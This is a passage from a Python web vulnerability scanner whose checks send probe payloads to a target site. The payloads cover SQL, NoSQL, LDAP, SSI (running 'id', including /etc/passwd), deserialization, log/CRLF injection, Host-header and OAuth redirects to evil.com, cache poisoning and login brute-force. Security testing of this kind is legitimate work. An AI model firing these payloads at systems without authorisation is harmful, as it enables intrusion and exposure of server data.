                            for label, substr in weak_cipher_strings:
                                if substr.upper() in cipher_name:
                                    findings.append(self._make_finding(
                                        url=f"https://{host}:{port}",
                                        method="CONNECT",
                                        param="",
                                        param_type="tls",
                                        vuln_type="weak_cipher",
                                        finding=f"Server negotiated weak cipher {cipher_info[0]} ({label}) by default",
                                        severity="high",
                                        proof=f"Default cipher: {cipher_info[0]} version={cipher_info[1]} bits={cipher_info[2]}",
                                        payload=cipher_info[0],
                                    ))
                                    break
            except (ssl.SSLError, OSError, AttributeError):
                pass

            # Second: actively probe each weak cipher family
            for label, cipher_str in weak_openssl_suites:
                if self.stop_event.is_set():
                    break
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_ciphers(cipher_str)
                    with socket.create_connection((host, port), timeout=self.timeout) as sock:
                        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                            accepted = ssock.cipher()
                            if accepted:
                                findings.append(self._make_finding(
                                    url=f"https://{host}:{port}",
                                    method="CONNECT",
                                    param="",
                                    param_type="tls",
                                    vuln_type="weak_cipher",
                                    finding=f"Server accepts weak {label} cipher suite: {accepted[0]}",
                                    severity="high",
                                    proof=f"Cipher probe {cipher_str} -> accepted {accepted[0]} bits={accepted[2]}",
                                    payload=accepted[0],
                                ))
                except (ssl.SSLError, OSError, ValueError):
                    # Expected — server correctly rejected the weak cipher
                    continue
                except AttributeError:
                    continue

        return findings

    # ── Brute-force protection ─────────────────────────────────────────────

    def _check_brute_force_protection(self, sitemap) -> list[ScanFinding]:
        findings = []
        login_keywords = ("login", "signin", "auth", "authenticate", "token", "oauth")
        login_endpoints = [
            p for p in (sitemap.pages if hasattr(sitemap, "pages") else [])
            if any(kw in p.lower() for kw in login_keywords)
        ]
        if not login_endpoints:
            return findings

        sess = requests.Session()
        sess.verify = False

        for url in login_endpoints:
            if self.stop_event.is_set():
                break
            statuses = []
            lockout_detected = False
            for i in range(10):
                if self.stop_event.is_set():
                    break
                try:
                    r = sess.post(
                        url,
                        data={"username": f"test_user_{i:04d}", "password": f"wrong_pass_{i:04d}"},
                        timeout=self.timeout, verify=False, allow_redirects=False,
                    )
                    statuses.append(r.status_code)
                    body_l = r.text.lower()
                    if r.status_code == 429 or any(
                        sig in body_l for sig in ("locked", "captcha", "too many", "rate limit")
                    ):
                        lockout_detected = True
                        break
                except Exception:
                    continue

            if statuses and not lockout_detected:
                findings.append(self._make_finding(
                    url=url, method="POST", param="username",
                    param_type="form", vuln_type="brute_force_no_protection",
                    finding=f"No brute-force protection — 10 rapid login attempts with no lockout or rate limit [{url}]",
                    severity="high",
                    proof=f"Status codes across 10 attempts: {statuses}",
                    payload="10x POST username=test_user_NNNN&password=wrong_pass_NNNN",
                ))

        sess.close()
        return findings

    # ── Logging & monitoring detection (A09:2025) ──────────────────────────

    def _check_logging_monitoring(self, sitemap) -> list[ScanFinding]:
        findings = []
        pages = list(sitemap.pages if hasattr(sitemap, "pages") else [])[:3]
        if not pages:
            return findings

        monitoring_headers = ("x-request-id", "x-correlation-id")
        waf_headers = ("x-waf", "x-sucuri-id", "x-cloudflare", "cf-ray",
                       "x-akamai-transformed", "server-timing")
        monitoring_detected = False

        for url in pages:
            if self.stop_event.is_set():
                break
            try:
                # 1. Send a suspicious request with SQLi payload
                sqli_url = url + ("&" if "?" in url else "?") + "id=1'%20OR%201%3D1--"
                suspicious_resp = self.session.get(
                    sqli_url, timeout=self.timeout, verify=False, allow_redirects=False,
                )

                # 2. Send a normal follow-up request
                normal_resp = self.session.get(
                    url, timeout=self.timeout, verify=False, allow_redirects=False,
                )

                # Check for monitoring/correlation headers (positive signal)
                resp_headers_lower = {k.lower(): v for k, v in normal_resp.headers.items()}
                if any(h in resp_headers_lower for h in monitoring_headers):
                    monitoring_detected = True
                    break

                # Check for WAF headers (positive signal)
                if any(h in resp_headers_lower for h in waf_headers):
                    monitoring_detected = True
                    break

                # If suspicious request was blocked but normal wasn't → monitoring exists
                if suspicious_resp.status_code in (403, 406, 429) and normal_resp.status_code == 200:
                    monitoring_detected = True
                    break

            except Exception:
                continue

        if not monitoring_detected and pages:
            # Note: absence of externally visible WAF/correlation signals does NOT mean
            # monitoring is absent — server-side logging is invisible from the outside.
            # This is an observation, not a confirmed vulnerability.
            findings.append(self._make_finding(
                url=pages[0], method="GET", param="id",
                param_type="query", vuln_type="logging_monitoring_absent",
                finding="No externally observable security monitoring signals detected (WAF headers, correlation IDs, request blocking)",
                severity="info",
                proof=f"Tested {len(pages)} endpoint(s); no WAF response headers or request correlation headers observed",
                payload="?id=1' OR 1=1--",
            ))

        return findings

    # ── Subresource Integrity (SRI) check ─────────────────────────────────────

    _SRI_TAG_RE = re.compile(
        r"<(?:script|link)\b([^>]*?)(?:src|href)\s*=\s*[\"']([^\"']+)[\"']([^>]*)>",
        re.I,
    )

    def _check_sri(self, sitemap) -> list[ScanFinding]:
        """Check external script/link tags for missing Subresource Integrity attributes."""
        findings = []
        seen: set[tuple[str, str]] = set()

        for url, page in sitemap.pages.items():
            if self.stop_event.is_set():
                break
            body = page.get("body", "")
            if not body:
                continue

            page_domain = urlparse(url).netloc.lower()

            for m in self._SRI_TAG_RE.finditer(body):
                attrs_before, resource_url, attrs_after = m.group(1), m.group(2), m.group(3)
                # Resolve relative URLs
                full_resource = resource_url if resource_url.startswith(("http://", "https://", "//")) else None
                if full_resource is None:
                    continue  # relative URL → same origin, skip

                resource_domain = urlparse(
                    full_resource if not full_resource.startswith("//") else "https:" + full_resource
                ).netloc.lower()

                if not resource_domain or resource_domain == page_domain:
                    continue  # same origin, SRI not required

                # Check for integrity attribute in the full tag
                full_attrs = attrs_before + attrs_after
                if "integrity=" in full_attrs.lower():
                    continue  # SRI present

                key = (url, resource_url)
                if key in seen:
                    continue
                seen.add(key)

                findings.append(self._make_finding(
                    url=url,
                    method="GET",
                    param="integrity",
                    param_type="passive",
                    vuln_type="sri_missing",
                    finding=f"External resource loaded without Subresource Integrity: {resource_url}",
                    severity="medium",
                    proof=m.group(0)[:200],
                    payload="",
                ))

        return findings

    # ── Supply-chain runtime version check ────────────────────────────────────

    _VULNERABLE_LIBS = {
        "jquery": {"pattern": r"jQuery\s+v?([\d.]+)", "vuln_below": "3.5.0", "cve": "CVE-2020-11022"},
        "angularjs": {"pattern": r"AngularJS\s+v?([\d.]+)", "vuln_below": "1.6.0", "cve": "CVE-2019-14863"},
        "lodash": {"pattern": r"lodash\s+([\d.]+)", "vuln_below": "4.17.21", "cve": "CVE-2021-23337"},
        "bootstrap": {"pattern": r"Bootstrap\s+v?([\d.]+)", "vuln_below": "3.4.0", "cve": "CVE-2018-14041"},
        "moment": {"pattern": r"moment\.js\s+v?([\d.]+)", "vuln_below": "2.29.2", "cve": "CVE-2022-24785"},
        "dompurify": {"pattern": r"DOMPurify\s+([\d.]+)", "vuln_below": "2.3.6", "cve": "CVE-2022-25890"},
        "handlebars": {"pattern": r"Handlebars\s+v?([\d.]+)", "vuln_below": "4.7.7", "cve": "CVE-2021-23369"},
        "underscore": {"pattern": r"Underscore\.js\s+([\d.]+)", "vuln_below": "1.13.1", "cve": "CVE-2021-23358"},
    }

    @staticmethod
    def _version_lt(version_str: str, target_str: str) -> bool:
        """Return True if version_str < target_str using integer tuple comparison."""
        try:
            v = tuple(int(x) for x in version_str.split("."))
            t = tuple(int(x) for x in target_str.split("."))
            return v < t
        except (ValueError, AttributeError):
            return False

    _JS_SRC_RE = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)

    def _check_supply_chain_runtime(self, sitemap) -> list[ScanFinding]:
        """Fetch external JS files and check for known-vulnerable library versions."""
        findings = []
        fetched_urls: set[str] = set()
        reported: set[tuple[str, str]] = set()  # (lib_name, version)

        for url, page in sitemap.pages.items():
            if self.stop_event.is_set():
                break
            body = page.get("body", "")
            if not body:
                continue

            # Collect JS URLs from this page
            js_urls = self._JS_SRC_RE.findall(body)

            for js_url in js_urls:
                if self.stop_event.is_set():
                    break

                # Resolve relative URLs
                if js_url.startswith("//"):
                    js_url = "https:" + js_url
                elif js_url.startswith("/"):
                    parsed_page = urlparse(url)
                    js_url = f"{parsed_page.scheme}://{parsed_page.netloc}{js_url}"
                elif not js_url.startswith(("http://", "https://")):
                    continue

                if js_url in fetched_urls:
                    continue
                fetched_urls.add(js_url)

                try:
                    resp = self._req("GET", js_url)
                    if not resp or resp.status_code != 200:
                        continue
                    content = resp.text[:50000]  # cap to avoid huge files
                except Exception:
                    continue

                for lib_name, lib_info in self._VULNERABLE_LIBS.items():
                    m = re.search(lib_info["pattern"], content, re.I)
                    if not m:
                        continue
                    version = m.group(1)
                    if not self._version_lt(version, lib_info["vuln_below"]):
                        continue

                    key = (lib_name, version)
                    if key in reported:
                        continue
                    reported.add(key)

                    findings.append(self._make_finding(
                        url=url,
                        method="GET",
                        param=js_url,
                        param_type="passive",
                        vuln_type="supply_chain_runtime",
                        finding=(
                            f"Vulnerable {lib_name} v{version} detected "
                            f"(CVE: {lib_info['cve']}, vulnerable below {lib_info['vuln_below']})"
                        ),
                        severity="high",
                        proof=m.group(0)[:200],
                        payload="",
                    ))

        return findings

    # ── Host Header Injection ─────────────────────────────────────────────────

    def _check_host_header_injection(self, sitemap) -> list[ScanFinding]:
        """Test Host header manipulation for poisoning / password reset hijack."""
        findings = []
        evil = "evil.com"
        inject_headers = [
            ("Host", evil),
            ("X-Forwarded-Host", evil),
            ("X-Host", evil),
            ("X-Forwarded-Server", evil),
        ]
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            # Baseline: clean request to see if evil.com already appears naturally
            try:
                time.sleep(self.rate_limit)
                baseline_resp = self._req("GET", url)
                baseline_body = (baseline_resp.text[:5000] if baseline_resp else "")
                baseline_loc  = (baseline_resp.headers.get("Location", "") if baseline_resp else "")
                if evil in baseline_body or evil in baseline_loc:
                    continue  # evil.com already present without injection — skip URL
            except Exception:
                pass

            for hdr_name, hdr_val in inject_headers:
                if self.stop_event.is_set():
                    break
                try:
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", url, headers={hdr_name: hdr_val})
                    if not resp:
                        continue
                    body = resp.text[:5000]
                    loc  = resp.headers.get("Location", "")
                    # Require exact word/host-level match, not substring (avoids "notevil.com")
                    from urllib.parse import urlparse as _up
                    body_hit = evil in body and (f"{evil}" in body)
                    loc_hit  = False
                    if loc:
                        try:
                            loc_hit = (_up(loc).hostname or "").rstrip(".").endswith(evil)
                        except Exception:
                            loc_hit = evil in loc
                    if body_hit or loc_hit:
                        findings.append(self._make_finding(
                            url=url, method="GET", param=hdr_name,
                            param_type="header", vuln_type="host_header_injection",
                            finding=f"Host header injection — {hdr_name}: {hdr_val} reflected [{url}]",
                            severity="high",
                            proof=f"Header {hdr_name}: {hdr_val} | Location: {loc[:200]} | Body match: {body_hit}",
                            payload=f"{hdr_name}: {hdr_val}",
                            status_code=resp.status_code,
                        ))
                        break  # one finding per URL is enough
                except Exception:
                    continue
        return findings

    # ── HTTP Parameter Pollution ──────────────────────────────────────────────

    def _check_hpp(self, sitemap) -> list[ScanFinding]:
        """Test HTTP Parameter Pollution via duplicate query parameters."""
        findings = []
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param_name in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                try:
                    # Duplicate param with injected value
                    dup_query = parsed.query + f"&{param_name}=hpp_injected"
                    dup_url = urlunparse(parsed._replace(query=dup_query))
                    time.sleep(self.rate_limit)
                    resp_dup = self._req("GET", dup_url)
                    time.sleep(self.rate_limit)
                    resp_orig = self._req("GET", url)
                    if not resp_dup or not resp_orig:
                        continue
                    body_dup = resp_dup.text[:5000]
                    # Check for: injected value reflected, status change, or error
                    if "hpp_injected" in body_dup or resp_dup.status_code != resp_orig.status_code:
                        findings.append(self._make_finding(
                            url=url, method="GET", param=param_name,
                            param_type="query", vuln_type="hpp",
                            finding=f"HTTP Parameter Pollution — duplicate param '{param_name}' accepted [{url}]",
                            severity="medium",
                            proof=f"Original status: {resp_orig.status_code} | Dup status: {resp_dup.status_code} | Reflected: {'hpp_injected' in body_dup}",
                            payload=f"{param_name}=normal&{param_name}=hpp_injected",
                            status_code=resp_dup.status_code,
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── NoSQL Injection ───────────────────────────────────────────────────────

    def _check_nosql_injection(self, sitemap) -> list[ScanFinding]:
        """Test for MongoDB NoSQL injection via operator injection."""
        findings = []
        nosql_errors = re.compile(
            r"MongoError|mongo(?:db|\.)|BSON|"
            r"Unexpected token|Cast to ObjectId failed|"
            r"E11000 duplicate key|unterminated string",
            re.I,
        )
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for pname in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                payloads = [
                    (f"{pname}[$ne]=x", "operator_ne"),
                    (f"{pname}[$gt]=", "operator_gt"),
                    (f"{pname}[$where]=1==1", "where_clause"),
                ]
                for payload_qs, label in payloads:
                    try:
                        # Replace existing param with injection
                        new_query = parsed.query.replace(
                            f"{pname}={params[pname][0]}", payload_qs
                        ) if params[pname][0] else parsed.query + f"&{payload_qs}"
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        time.sleep(self.rate_limit)
                        resp_orig = self._req("GET", url)
                        if not resp or not resp_orig:
                            continue
                        body = resp.text[:5000]
                        # Detect: error strings or unexpected status change
                        if nosql_errors.search(body) or (
                            resp_orig.status_code in (401, 403) and resp.status_code == 200
                        ):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="nosql_injection",
                                finding=f"NoSQL injection ({label}) — operator accepted in param '{pname}' [{url}]",
                                severity="critical",
                                proof=f"Status: {resp.status_code} | Error match: {bool(nosql_errors.search(body))} | Body: {body[:200]}",
                                payload=payload_qs,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── Deserialization ───────────────────────────────────────────────────────

    def _check_deserialization(self, sitemap) -> list[ScanFinding]:
        """Probe for insecure deserialization (Java, PHP, Python, JSON type juggling)."""
        findings = []
        deser_errors = re.compile(
            r"java\.io\.(IOException|ObjectInputStream)|ClassNotFoundException|"
            r"unserialize\(\)|__wakeup|O:\d+:|"
            r"pickle\.loads|_pickle\.UnpicklingError|"
            r"com\.fasterxml\.jackson|"
            r"InvalidClassException|StreamCorruptedException",
            re.I,
        )
        probes = [
            ("rO0ABXNyABNqYXZhLmxhbmcuSW50ZWdlcg==", "java_serialized"),
            ('O:8:"stdClass":0:{}', "php_serialize"),
            ("gASVAAAAAAAAAA==", "python_pickle"),
            ('{"__class__":"os.system","__args__":["id"]}', "json_type_juggle"),
        ]
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
        for url in list(sitemap.pages.keys())[:8]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for pname in list(params.keys())[:2]:
                if self.stop_event.is_set():
                    break
                for payload, label in probes:
                    try:
                        new_query = f"{pname}={payload}"
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        if not resp:
                            continue
                        body = resp.text[:5000]
                        if resp.status_code == 500 or deser_errors.search(body):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="deserialization",
                                finding=f"Deserialization probe ({label}) triggered error in param '{pname}' [{url}]",
                                severity="critical",
                                proof=f"Status: {resp.status_code} | Body: {body[:250]}",
                                payload=payload,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── SSI Injection ─────────────────────────────────────────────────────────

    def _check_ssi_injection(self, sitemap) -> list[ScanFinding]:
        """Test for Server-Side Include injection."""
        findings = []
        ssi_payloads = [
            ('<!--#exec cmd="id"-->', ["uid=", "gid="]),
            ('<!--#include virtual="/etc/passwd"-->', ["root:", "daemon:"]),
            ('<!--#echo var="DATE_LOCAL"-->', []),  # check for date-like output
            ('<!--#printenv -->', ["SERVER_", "DOCUMENT_ROOT", "PATH="]),
        ]
        from urllib.parse import urlparse as _up, parse_qs, urlunparse
        for url in list(sitemap.pages.keys())[:8]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for pname in list(params.keys())[:2]:
                if self.stop_event.is_set():
                    break
                for payload, markers in ssi_payloads:
                    try:
                        new_query = f"{pname}={payload}"
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        if not resp:
                            continue
                        body = resp.text[:5000]
                        executed = any(m in body for m in markers) if markers else False
                        # For DATE_LOCAL, check if a plausible date appeared
                        if not markers and payload == '<!--#echo var="DATE_LOCAL"-->':
                            executed = bool(re.search(r"\d{4}-\d{2}-\d{2}|\w+ \d{1,2}, \d{4}", body))
                        if executed:
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="ssi_injection",
                                finding=f"SSI injection — directive executed in param '{pname}' [{url}]",
                                severity="critical",
                                proof=f"Payload: {payload} | Body: {body[:250]}",
                                payload=payload,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── LDAP Injection ────────────────────────────────────────────────────────

    def _check_ldap_injection(self, sitemap) -> list[ScanFinding]:
        """Test for LDAP injection via operator-like payloads."""
        findings = []
        ldap_errors = re.compile(
            r"ldap_search|ldap_bind|invalid DN syntax|"
            r"LDAP Result|javax\.naming|NamingException|"
            r"Bad search filter|"
            r"ldap_err2string|ldap_parse_result",
            re.I,
        )
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*)",
            "admin)(&(password=*)",
            "*",
        ]
        from urllib.parse import urlparse as _up, parse_qs, urlunparse
        for url in list(sitemap.pages.keys())[:8]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for pname in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                for payload in ldap_payloads:
                    try:
                        new_query = f"{pname}={payload}"
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        time.sleep(self.rate_limit)
                        resp_orig = self._req("GET", url)
                        if not resp or not resp_orig:
                            continue
                        body = resp.text[:5000]
                        if ldap_errors.search(body) or (
                            resp_orig.status_code in (401, 403) and resp.status_code == 200
                        ):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="ldap_injection",
                                finding=f"LDAP injection — operator payload accepted in param '{pname}' [{url}]",
                                severity="high",
                                proof=f"Status: {resp.status_code} (orig: {resp_orig.status_code}) | Body: {body[:250]}",
                                payload=payload,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── Log Injection ─────────────────────────────────────────────────────────

    def _check_log_injection(self, sitemap) -> list[ScanFinding]:
        """Test for log injection via CRLF and log-format payloads."""
        findings = []
        log_payloads = [
            ("\r\nINFO: Admin logged in from 1.2.3.4", "crlf_log"),
            ("%0aINFO:%20fake%20log%20entry", "url_encoded_crlf"),
            ("\nContent-Type: text/html\n\n<script>alert(1)</script>", "response_split"),
        ]
        from urllib.parse import urlparse as _up, parse_qs, urlunparse
        for url in list(sitemap.pages.keys())[:8]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for pname in list(params.keys())[:3]:
                if self.stop_event.is_set():
                    break
                for payload, label in log_payloads:
                    try:
                        new_query = f"{pname}={payload}"
                        inj_url = urlunparse(parsed._replace(query=new_query))
                        time.sleep(self.rate_limit)
                        resp = self._req("GET", inj_url)
                        if not resp:
                            continue
                        body = resp.text[:5000]
                        raw_headers = str(resp.headers)
                        # Check if CRLF sequences were not stripped
                        if ("Admin logged in" in body or
                            "fake log entry" in body or
                            "INFO:" in body and "1.2.3.4" in body or
                            "text/html" in raw_headers and "<script>" in body):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="log_injection",
                                finding=f"Log injection ({label}) — payload reflected in param '{pname}' [{url}]",
                                severity="medium",
                                proof=f"Body: {body[:250]}",
                                payload=payload,
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ── OAuth Misconfiguration ────────────────────────────────────────────────

    def _check_oauth_misconfig(self, sitemap) -> list[ScanFinding]:
        """Test OAuth redirect_uri manipulation and missing state parameter."""
        findings = []
        redirect_params = {"redirect_uri", "redirect_url", "callback", "return_to"}
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse
        for url in list(sitemap.pages.keys())[:15]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            matching = [p for p in params if p.lower() in redirect_params]
            if not matching:
                continue
            for pname in matching:
                try:
                    # Test evil redirect
                    evil_redirect = "https://evil.com/callback"
                    new_params = dict(params)
                    new_params[pname] = [evil_redirect]
                    new_query = urlencode(new_params, doseq=True)
                    inj_url = urlunparse(parsed._replace(query=new_query))
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", inj_url)
                    if resp:
                        loc = resp.headers.get("Location", "")
                        if "evil.com" in loc:
                            findings.append(self._make_finding(
                                url=url, method="GET", param=pname,
                                param_type="query", vuln_type="oauth_misconfig",
                                finding=f"OAuth open redirect — {pname} accepts external URL [{url}]",
                                severity="high",
                                proof=f"Redirect Location: {loc[:300]}",
                                payload=evil_redirect,
                                status_code=resp.status_code,
                            ))
                    # Check for missing state
                    if "state" not in params:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="state",
                            param_type="query", vuln_type="oauth_misconfig",
                            finding=f"OAuth flow missing 'state' parameter — CSRF risk [{url}]",
                            severity="high",
                            proof=f"Query: {parsed.query[:200]} — no state param found",
                            payload="",
                        ))
                except Exception:
                    continue
        return findings

    # ── OAuth Device Flow Token Reuse ─────────────────────────────────────────

    def _check_oauth_device_flow(self, sitemap) -> list[ScanFinding]:
        """Test for OAuth 2.0 device flow endpoint existence and device code reuse."""
        findings = []
        base = self.target.rstrip("/")
        device_endpoints = [
            "/device/code", "/oauth/device/code", "/oauth/device/authorization",
            "/connect/device_authorization", "/v1/device/authorization",
        ]
        token_endpoints = [
            "/token", "/oauth/token", "/connect/token", "/v1/token",
        ]
        grant_type = "urn:ietf:params:oauth:grant-type:device_code"

        device_code = None
        device_url = None

        for path in device_endpoints:
            if self.stop_event.is_set():
                break
            url = base + path
            try:
                resp = self._req("POST", url, data={
                    "client_id": "test_client",
                    "scope": "openid profile",
                }, headers={"Content-Type": "application/x-www-form-urlencoded"})
                if not resp or resp.status_code not in (200, 400, 401):
                    continue
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        device_code = body.get("device_code") or body.get("user_code")
                        if device_code:
                            device_url = url
                            findings.append(self._make_finding(
                                url=url, method="POST", param="device_code",
                                param_type="form", vuln_type="oauth_device_flow_reuse",
                                finding=f"OAuth device flow endpoint found — device code obtained [{url}]",
                                severity="info",
                                proof=f"device_code: {str(device_code)[:30]}...",
                                payload="client_id=test_client&scope=openid",
                                status_code=resp.status_code,
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                continue

        if not device_code or not device_url:
            return findings

        # Attempt to exchange the device code twice — second must return invalid_grant
        for token_path in token_endpoints:
            if self.stop_event.is_set():
                break
            token_url = base + token_path
            exchange_body = {
                "grant_type": grant_type,
                "device_code": device_code,
                "client_id": "test_client",
            }
            reuse_count = 0
            for attempt in range(2):
                try:
                    resp2 = self._req(
                        "POST", token_url, data=exchange_body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )
                    if not resp2:
                        break
                    if resp2.status_code == 200:
                        reuse_count += 1
                except Exception:
                    break

            if reuse_count >= 2:
                findings.append(self._make_finding(
                    url=token_url, method="POST", param="device_code",
                    param_type="form", vuln_type="oauth_device_flow_reuse",
                    finding=(
                        f"OAuth device code reuse — same code exchanged twice "
                        f"without invalidation [{token_url}]"
                    ),
                    severity="high",
                    proof=f"Two consecutive token exchanges with same device_code both returned HTTP 200",
                    payload=f"device_code={str(device_code)[:20]}...",
                    status_code=200,
                ))
                break

        return findings

    # ── OAuth State Parameter Scope Elevation ─────────────────────────────────

    def _check_oauth_state_reuse(self, sitemap) -> list[ScanFinding]:
        """Detect weak OAuth state values and test state parameter reuse."""
        findings = []
        from urllib.parse import urlparse as _up, parse_qs, urlencode, urlunparse

        state_values: list[tuple[str, str]] = []  # (url, state_value)

        for url in list(sitemap.pages.keys())[:20]:
            if self.stop_event.is_set():
                break
            parsed = _up(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            state_vals = params.get("state", [])
            if not state_vals:
                continue
            state_val = state_vals[0]
            state_values.append((url, state_val))

            # Weak state: too short (< 16 chars ≈ < 128-bit entropy)
            if len(state_val) < 16:
                findings.append(self._make_finding(
                    url=url, method="GET", param="state",
                    param_type="query", vuln_type="oauth_state_weak",
                    finding=(
                        f"OAuth state parameter is too short ({len(state_val)} chars) — "
                        f"susceptible to CSRF via brute-force [{url}]"
                    ),
                    severity="medium",
                    proof=f"state={state_val[:40]} (length {len(state_val)})",
                    payload=state_val[:40],
                    status_code=0,
                ))

            # Numeric-only state is predictable
            if state_val.isdigit():
                findings.append(self._make_finding(
                    url=url, method="GET", param="state",
                    param_type="query", vuln_type="oauth_state_weak",
                    finding=(
                        f"OAuth state parameter is numeric — predictable and "
                        f"susceptible to CSRF [{url}]"
                    ),
                    severity="medium",
                    proof=f"state={state_val[:40]} (numeric only)",
                    payload=state_val[:40],
                    status_code=0,
                ))

        # Test state reuse: replay same callback URL twice, check if second accepted
        for cb_url, state_val in state_values[:3]:
            if self.stop_event.is_set():
                break
            try:
                resp1 = self._req("GET", cb_url)
                resp2 = self._req("GET", cb_url)
                if (resp1 and resp2
                        and resp1.status_code in (200, 302)
                        and resp2.status_code in (200, 302)):
                    findings.append(self._make_finding(
                        url=cb_url, method="GET", param="state",
                        param_type="query", vuln_type="oauth_state_weak",
                        finding=(
                            f"OAuth state parameter reuse accepted — same callback URL "
                            f"returned success on second request [{cb_url}]"
                        ),
                        severity="high",
                        proof=(
                            f"First request: HTTP {resp1.status_code}; "
                            f"Second request: HTTP {resp2.status_code} — state not consumed"
                        ),
                        payload=f"state={state_val[:40]}",
                        status_code=resp2.status_code,
                    ))
                    break
            except Exception:
                continue

        return findings

    # ── Web Cache Poisoning ───────────────────────────────────────────────────

    def _check_web_cache_poisoning(self, sitemap) -> list[ScanFinding]:
        """Test for web cache poisoning via unkeyed headers."""
        findings = []
        canary = f"canary-{uuid.uuid4().hex[:8]}.evil.com"
        poison_headers = [
            ("X-Forwarded-Host", canary, "forwarded_host"),
            ("X-Original-URL", "/admin", "original_url"),
            ("X-Rewrite-URL", "/admin", "rewrite_url"),
            ("X-Forwarded-Scheme", "http", "scheme_downgrade"),
        ]
        for url in list(sitemap.pages.keys())[:8]:
            if self.stop_event.is_set():
                break
            try:
                time.sleep(self.rate_limit)
                resp_orig = self._req("GET", url)
                if not resp_orig:
                    continue
                orig_body = resp_orig.text[:5000]
            except Exception:
                continue
            for hdr_name, hdr_val, label in poison_headers:
                if self.stop_event.is_set():
                    break
                try:
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", url, headers={hdr_name: hdr_val})
                    if not resp:
                        continue
                    body = resp.text[:5000]
                    raw_headers = str(resp.headers)
                    reflected = hdr_val in body or hdr_val in raw_headers
                    diff_response = (label in ("original_url", "rewrite_url") and
                                     resp.status_code != resp_orig.status_code)
                    if reflected or diff_response:
                        findings.append(self._make_finding(
                            url=url, method="GET", param=hdr_name,
                            param_type="header", vuln_type="web_cache_poisoning",
                            finding=f"Web cache poisoning — unkeyed header {hdr_name} affects response [{url}]",
                            severity="high",
                            proof=f"Header: {hdr_name}: {hdr_val} | Reflected: {reflected} | Status diff: {diff_response}",
                            payload=f"{hdr_name}: {hdr_val}",
                            status_code=resp.status_code,
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── Cache Poisoning (persistence) ─────────────────────────────────────────

    def _check_cache_poisoning(self, sitemap) -> list[ScanFinding]:
        """Confirm web cache poisoning via two-request persistence test.

        Unlike _check_web_cache_poisoning (single-request reflection check),
        this method verifies that an injected canary value *persists* in the
        cache: it sends a poisoned request then a clean follow-up request
        (no extra headers) and flags the URL only when the canary appears in
        the clean response — confirming the value was stored in cache.
        """
        findings = []

        # Header name → canary value template; {canary} replaced per test.
        UNKEYED_HEADERS = [
            ("X-Forwarded-Host",   "evil-{canary}.attacker.com"),
            ("X-Host",             "evil-{canary}.attacker.com"),
            ("X-Forwarded-Server", "evil-{canary}.attacker.com"),
            ("X-Forwarded-Port",   "9999-{canary}"),
            ("X-Forwarded-Prefix", "/{canary}"),
            ("Forwarded",          "host=evil-{canary}.attacker.com"),
        ]

        for url in islice(sitemap.pages.keys(), 8):
            if self.stop_event.is_set():
                break
            for hdr_name, val_tmpl in UNKEYED_HEADERS:
                if self.stop_event.is_set():
                    break
                canary  = uuid.uuid4().hex[:10]
